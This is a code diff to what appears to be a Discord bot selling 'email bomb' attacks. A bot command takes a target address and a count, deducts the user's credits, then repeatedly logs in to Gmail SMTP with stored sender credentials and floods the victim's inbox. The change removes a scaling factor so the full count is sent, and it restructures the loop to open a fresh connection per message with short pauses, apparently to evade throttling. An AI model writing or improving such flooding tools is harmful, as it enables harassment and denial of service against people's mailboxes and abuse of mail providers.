@@ -30,7 +30,7 @@ def _details(emailTarget, emailFreq):
     indexPass = mailPasswords[indexMail]
     
     mailTarget = emailTarget
-    mailFreq = int(emailFreq*0.1)
+    mailFreq = int(emailFreq)
 
     mailServer = 'smtp.gmail.com'
     mailPort = int(587)
@@ -49,12 +49,7 @@ def _details(emailTarget, emailFreq):
     s.ehlo()
     s.login(mailFromAddr, mailFromPwd)
 
-    counter =0
-    for email in range(int(mailFreq)):
-        s.sendmail(mailFromAddr, mailTarget, mailMsg)
-        counter += 1
-        if (counter%5) == 0:
-            time.sleep(10)
+    s.sendmail(mailFromAddr, mailTarget, mailMsg)
 
     s.close()
 
@@ -167,7 +162,12 @@ async def bomb(ctx, *arg):
             await ctx.send(f"\n >>> `Email bomb started, I have DM you with start and end time! \n This bomb cost {emailFreq}`")
             await ctx.author.send(f"\n > Email bomb started at {datetime.now()}")
             uses[ctx.message.author.id] -= emailFreq
-            _details(emailTarget, emailFreq)
+            counter=0
+            for i in range(emailFreq):
+                _details(emailTarget, emailFreq)
+                counter+=1
+                if (counter%10) == 0:
+                    time.sleep(3)
             await ctx.author.send(f"\n > Email bomb completed, finished at {datetime.now()}")
             pickle_out = open("dict.pickle", "wb")
             pickle.dump(uses, pickle_out)
